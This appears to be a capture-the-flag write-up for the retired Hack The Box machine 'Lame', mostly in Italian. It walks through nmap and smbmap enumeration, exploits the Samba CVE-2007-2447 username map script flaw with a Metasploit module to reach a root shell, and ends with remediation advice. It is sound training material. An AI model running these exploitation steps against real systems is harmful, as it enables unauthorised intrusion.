# HTB - Lame

**Difficulty:** Easy  
**OS:** Linux  
**Status:** Retired ✅

---

## Summary

Lame is a classic Easy Linux machine — la prima mai pubblicata su HTB. Si ottiene accesso root sfruttando una vulnerabilità nel servizio Samba tramite Metasploit. Nessun passaggio complicato: enumeration base + un exploit ben noto.

---

## Tools Used

- Nmap
- smbmap
- searchsploit
- Metasploit Framework

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC -p- -Pn --min-rate 5000 <TARGET_IP>
```

**Porte aperte:**
- 21 → vsftpd 2.3.4
- 22 → OpenSSH
- 139/445 → Samba 3.0.20-Debian
- 3632 → distccd

---

### 2. FTP - Vicolo cieco

FTP permette il login anonimo ma la directory è vuota. Niente di utile.

vsftpd 2.3.4 ha una backdoor nota (CVE-2011-2523) ma in questo caso **l'exploit fallisce** — la backdoor è patchata.

---

### 3. SMB - Il vettore giusto

```bash
smbmap -H <TARGET_IP>
```

Output: la share `tmp` ha permessi **READ/WRITE** per l'utente anonimo.

```bash
searchsploit "Samba 3.0.20"
```

Trovato: **Samba 3.0.20 < 3.0.25rc3 - Username map script - CVE-2007-2447**

Questa vulnerabilità permette l'esecuzione di comandi arbitrari tramite metacaratteri nella shell, sfruttando la funzione `SamrChangePassword` con `username map script` abilitato in smb.conf.

---

### 4. Exploitation con Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
set LHOST <TUN0_IP>
run
```

**Risultato:** shell ottenuta come `root` (uid=0).

---

### 5. Flags

```bash
cat /home/makis/user.txt   # user flag
cat /root/root.txt          # root flag
```

---

## What I Learned

- Come fare enumeration su FTP e SMB con Nmap e smbmap
- Che non tutti gli exploit funzionano — bisogna sempre verificare prima di perdere tempo
- Come usare searchsploit per trovare vulnerabilità note da una versione di servizio
- CVE-2007-2447: una delle vulnerabilità Samba più classiche nei CTF
- Come configurare e lanciare un exploit in Metasploit

---

## Remediation

- Aggiornare Samba a una versione non vulnerabile (>= 3.0.25rc3)
- Disabilitare `username map script` in smb.conf se non necessario
- Non esporre SMB su internet senza autenticazione
